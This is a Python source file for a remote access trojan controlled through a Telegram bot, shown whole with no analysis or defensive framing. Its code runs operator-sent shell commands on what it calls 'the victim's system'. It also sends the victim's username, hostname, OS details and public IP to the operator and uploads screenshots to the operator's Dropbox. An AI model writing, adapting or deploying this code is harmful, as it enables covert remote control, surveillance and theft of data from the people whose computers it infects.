import requests
import json
from bs4 import BeautifulSoup
import os
import time
import getpass
import platform
import pyautogui
import dropbox

bot_id = "YOUR_BOT_TOKEN"

chat_id = "YOUR_CHAT_ID"

db_token = "YOUR_DROPBOX_TOKEN"



def send_command(msg):
    url = f"https://api.telegram.org/bot{bot_id}/sendmessage?chat_id={chat_id}&text={msg}"
    req = requests.get(url)
    print(req.text)


def get_updates():
    url = f"https://api.telegram.org/bot{bot_id}/getupdates"
    bot_req = requests.get(url).content.decode()
    soup = BeautifulSoup(bot_req, "html.parser")
    extract = str(soup.find_all("pre"))[61:-7]
    make_it_dict = json.loads(extract)
    show_msg = make_it_dict['result'][-1]['message']['text']
    return show_msg


def execute_commands(command):
    com = os.system(command)
    send_command(com)


def get_info():
    user = getpass.getuser()
    info = platform.uname()
    tz = time.tzname[0]
    pub_ip = requests.get("https://api.ipify.org").text

    data = {
        "system_info": {
            "username": user,
            "hostname": info[1],
            "system-os": info[0],
            "os-version": info[2],
            "architecture": info[4],
            "time-zone": tz,
            "ip": pub_ip
        }
    }

    information = f"""
    The victim's system information:
        Username = {data["system_info"]["username"]}
        Hostname = {data['system_info']["hostname"]}
        System OS = {data['system_info']["system-os"]}
        OS Version = {data['system_info']["os-version"]}
        Architecture = {data['system_info']["architecture"]}
        Time Zone = {data['system_info']["time-zone"]}
        IP Address = {data['system_info']["ip"]}
    """
    send_command(information)


def get_screen():
    try:
        token = db_token
        screenshot = pyautogui.screenshot()
        picture_name = "ss.jpg"
        screenshot.save(picture_name)

        dbx = dropbox.Dropbox(token)
        with open(picture_name, "rb") as f:
            dbx.files_upload(f.read(), "/screenshot.png", mode=dropbox.files.WriteMode.overwrite)

        os.remove(picture_name)
        return True
    except:
        return False


def start():
    while True:
        check = get_updates()

        if check == "start":
            welcome = """
            Hello. How can I help you?
            Here is my list of commands:
            /cmd: Get a reverse shell
            /sysinfo: Get the system information
            """
            send_command(welcome)

        if check == "/cmd":
            com_info = "You are entering the shell mode now.\nSend your command to execute on the victim's system.\nPlease use /exit to exit shell mode."
            send_command(com_info)
            while True:
                commands = get_updates()
                if commands == "/exit":
                    break
                elif "/return" not in commands:
                    execute_commands(commands)
                    send_command("Please use /return to continue")
                    time.sleep(10)

        if check == "/sysinfo":
            com_info = "Please wait. We will get the victim's system information ;)"
            send_command(com_info)
            get_info()
            send_command("Please use /return to continue")
            time.sleep(10)

        if check == "/getscreen":
            process = get_screen()
            if process == True:
                send_command("Command successfully executed! Please check your Dropbox account to see the result.")
            else:
                send_command("Failed to execute the command!")


start()
